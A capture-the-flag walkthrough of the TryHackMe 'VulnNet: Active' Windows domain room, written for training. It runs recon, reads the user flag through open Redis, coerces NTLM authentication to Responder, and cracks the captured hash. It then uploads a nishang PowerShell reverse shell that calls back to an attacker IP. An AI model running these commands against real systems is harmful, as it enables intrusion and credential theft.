<h1 align="center">VulnNet: Active</h1>
<p align="center">2025, September 7<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>474</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>VulnNet Entertainment just moved their entire infrastructure... Check this out...</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/183b30b9-5b5a-425b-83ba-d289f3914547"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/vulnnetactive">here </a>.<br>
<img width="1200px" src=""></p>

<br>
<h2>Task 1 . VulnNet: Active</h2>
<p>﻿VulnNet Entertainment had a bad time with their previous network which suffered multiple breaches. Now they moved their entire infrastructure and hired you again as a core penetration tester. Your objective is to get full access to the system and compromise the domain.<br><br>

- Difficulty: Medium
- Operating System: Windows<br><br>
Another Windows machine. Do your best and breach it, good luck!<br><br>

Note: Since this is a windows machine you might need to give it up to 5 minutes to boot.<br><br>

Icon made by <a href="https://www.freepik.com/">Freepik</a> from <a href="http://www.flaticon.com/">www.flaticon.com</a></p>

<p><em>Answer the questions below</em></p>

<br>


<h2>Nmap</h2>
<p> 14 open ports:

- &nbsp;&nbsp;&nbsp; <code>53</code> &nbsp; : &nbsp; DNS<br>
- &nbsp; &nbsp; <code>135</code> &nbsp; : &nbsp; MSRPC<br>
- &nbsp;&nbsp; <code>139</code> &nbsp; : &nbsp; SMB<br>
- &nbsp;&nbsp; <code>445</code> &nbsp; : &nbsp; SMB<br>
- &nbsp;&nbsp; <code>464</code> &nbsp; : &nbsp; kpasswd5<br>
- &nbsp; <code>6379</code> &nbsp; : &nbsp; Redis &nbsp; : &nbsp; 2.8.2402<br>
- &nbsp; <code>9389</code> &nbsp; : &nbsp; .Net Message Framing<br>
- <code>49666</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49668</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49669</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49670</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49677</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49704</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49796</code> &nbsp; : &nbsp; Microsoft Windows RPC</p>

```bash
:~/VulnNetActive# nmap -sT xx.xxx.xx.xx
...
PORT    STATE SERVICE
53/tcp  open  domain
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
464/tcp open  kpasswd5
```

```bash
:~/VulnNetActive# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xx
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49796/tcp open  msrpc         Microsoft Windows RPC
...
Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: VULNNET-BC3TCK1, NetBIOS user: <unknown>, NetBIOS MAC: xx:xx:xx:xx:xx:xx (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-xx-xxTxx:xx:xx
|_  start_date: N/A
```

<h2>enum4linux</h2>

<p>

- Got domain/workgroup name: VULNNET<br>
- VULNNET-BC3TCK1 <20> -         B <ACTIVE>  File Server Service<br>
- VULNNET-BC3TCK1 <00> -         B <ACTIVE>  Workstation Service<br>
- Server vulnnet.thm allows sessions using username '', password ''<br>
- SMB1 disabled -- no workgroup available</p>

```bash
:~/VulnNetActive# enum4linux -a vulnnet.thm
...
 ========================== 
|    Target Information    |
 ========================== 
Target ........... vulnnet.thm
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on vulnnet.thm    |
 =================================================== 
[+] Got domain/workgroup name: VULNNET

 =========================================== 
|    Nbtstat Information for vulnnet.thm    |
 =========================================== 
Looking up status of xx.xxx.xx.xx
	VULNNET-BC3TCK1 <20> -         B <ACTIVE>  File Server Service
	VULNNET-BC3TCK1 <00> -         B <ACTIVE>  Workstation Service
	VULNNET         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	VULNNET         <1c> - <GROUP> B <ACTIVE>  Domain Controllers
	VULNNET         <1b> -         B <ACTIVE>  Domain Master Browser

	MAC Address = xx-xx-xx-xx-xx-xx

 ==================================== 
|    Session Check on vulnnet.thm    |
 ==================================== 
[+] Server vulnnet.thm allows sessions using username '', password ''

 ========================================== 
|    Getting domain SID for vulnnet.thm    |
 ========================================== 
Domain Name: VULNNET
Domain Sid: S-1-5-21-1405206085-1650434706-76331420
[+] Host is part of a domain (not a workgroup)

 ===================================== 
|    OS information on vulnnet.thm    |
 ===================================== 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for vulnnet.thm from smbclient: 
[+] Got OS info for vulnnet.thm from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================ 
|    Users on vulnnet.thm    |
 ============================ 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ======================================== 
|    Share Enumeration on vulnnet.thm    |
 ======================================== 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on vulnnet.thm

 =================================================== 
|    Password Policy Information for vulnnet.thm    |
 =================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/
...
 ====================================================================== 
|    Users on vulnnet.thm via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================ 
|    Getting printer info for vulnnet.thm    |
 ============================================ 
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
```

<h2>crackmapexec smb</h2>

```bash
:~/VulnNetActive# crackmapexec smb vulnnet.thm
SMB         xx.xxx.xx.xx    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
```

<h2>rpcdump</h2>

```bash
:~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm > report
```

```bash
:~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm | grep Print
```

<img width="1092" height="153" alt="image" src="https://github.com/user-attachments/assets/0000e99c-8695-430d-8749-512b6cc1d2d0" />

<br>
<br>

```bash
:~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
```

<h2>Redis</h2>

```bash
:~/VulnNetActive# apt install redis-tools
```

```bash
:~/VulnNetActive# redis-cli -h vulnnet.thm
vulnnet.thm:6379>
```

<img width="1091" height="142" alt="image" src="https://github.com/user-attachments/assets/b750486e-2402-46a3-96d7-237fce0b9761" />

<br>
<br>

```bash 
vulnnet.thm:6379> INFO
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:2112
run_id:fd5deedf4803915e1c9d9977c607e834a7d47642
...
```

```bash 
vulnnet.thm:6379> CONFIG GET pidfile
1) "pidfile"
2) "/var/run/redis.pid"
```

```bash
vulnnet.thm:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "dump.rdb"
3) ```
```

```bash
vulnnet.thm:6379> CONFIG GET logfile
1) "logfile"
2) ""
3) ```
```

<p>

- C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402</p>

```bash
vulnnet.thm:6379> CONFIG GET dir
1) "dir"
2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
3) ```
```

```bash
vulnnet.thm:6379> CONFIG GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
...
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
...
```

```bash
vulnnet.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
(error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
```

<img width="1086" height="106" alt="image" src="https://github.com/user-attachments/assets/30437ddd-c49c-425c-8407-688916217194" />

<br>
<br>

<p>1.1.  What is the user flag? (Desktop\user.txt)<br>
<code>THM{3eb176aee96432d5b100bc93580b291e}</code></p>

<br>

<h2>Reponder</h2>

```bash
:~/VulnNetActive# responder -I ens5
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

...
[+] Listening for events...
```

<h2>Redis</h2>

```bash
vulnnet.thm:6379> eval "dofile('//xx.xxx.xx.xx/share')" 0
(error) ERR Error running script (call to f_32380ab635d6cb342773862d8d86a17e07226ad8): @user_script:1: cannot open //xx.xxx.xx.xx/share: Permission denied 
```

<h2>Responder</h2>

```bash
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:74f30e663d27c058:CC0B81EE8B9201120686ED159A4183B8:010100000000000000F81DAD5815DC011C9C79CBCAB219E0000000000200080034004E005600510001001E00570049004E002D0047003500490047004A003200470034004C004E00330004003400570049004E002D0047003500490047004A003200470034004C004E0033002E0034004E00560051002E004C004F00430041004C000300140034004E00560051002E004C004F00430041004C000500140034004E00560051002E004C004F00430041004C000700080000F81DAD5815DC010600040002000000080030003000000000000000000000000030000046B2BA4B3F219184389733CCEF7D9876E0997C0921B6D126A0BEF7D02109F9290A001000000000000000000000000000000000000900220063006900660073002F00310030002E003200300031002E00370033002E00350033000000000000000000
```

<img width="1164" height="196" alt="image" src="https://github.com/user-attachments/assets/905024d2-c94d-4bda-b2a5-cb536979e4a6" />

<h3>Hash</h3>

```bash
:~/VulnNetActive# cat hash
enterprise-security::VULNNET:74f30e663d27c058:CC0B81EE8B9201120686ED159A4183B8:010100000000000000F81DAD5815DC011C9C79CBCAB219E0000000000200080034004E005600510001001E00570049004E002D0047003500490047004A003200470034004C004E00330004003400570049004E002D0047003500490047004A003200470034004C004E0033002E0034004E00560051002E004C004F00430041004C000300140034004E00560051002E004C004F00430041004C000500140034004E00560051002E004C004F00430041004C000700080000F81DAD5815DC010600040002000000080030003000000000000000000000000030000046B2BA4B3F219184389733CCEF7D9876E0997C0921B6D126A0BEF7D02109F9290A001000000000000000000000000000000000000900220063006900660073002F00310030002E003200300031002E00370033002E00350033000000000000000000
```

<h2>John the Ripper</h2>
<p>

-  enterprise-security : sand_0873959498</p>

```bash
:~/VulnNetActive# john hash --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1166" height="296" alt="image" src="https://github.com/user-attachments/assets/2673e1bc-b32f-45e0-8457-bb74486177a0" />

<h2>smbclient</h2>
<p>

- Enterprise-Share</p>

```bash
:~/VulnNetActive# smbclient -L vulnnet.thm -U enterprise-security
```

<img width="1173" height="265" alt="image" src="https://github.com/user-attachments/assets/06e388b5-f725-4fe4-bc58-3c7289e57860" />

<br>
<br>

```bash
:~/VulnNetActive# smbclient \\\\vulnnet.thm\\Enterprise-Share -U enterprise-security
```

<img width="1166" height="237" alt="image" src="https://github.com/user-attachments/assets/f86c9743-4732-4f0f-87f4-55adfbd85e48" />

<h2>Reverse Shell</h2>


<p>

- download <code>https://github.com/samratashok/nishang/tree/master/Shells/Invoke-PowerShellTcp.ps1</code><br>
- add <code>Invoke-PowerShellTcp -Reverse -IPAddress xx.xxxx.xx.xx -Port xxxx</code> to <code>Invoke-PowerShellTcp.ps1</code></p>


```bash
:~/VulnNetActive# curl https://github.com/samratashok/nishang/tree/master/Shells/Invoke-PowerShellTcp.ps1 -o Invoke-PowershellTcp.ps1
```

```bash
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress xx.xxxx.xx.xx -Port xxxx
```

```bash
smb: \> put Invoke-PowerShellTcp.ps1

```



<p>1.2. What is the system flag? (Desktop\system.txt)<br>
<code>________</code></p>









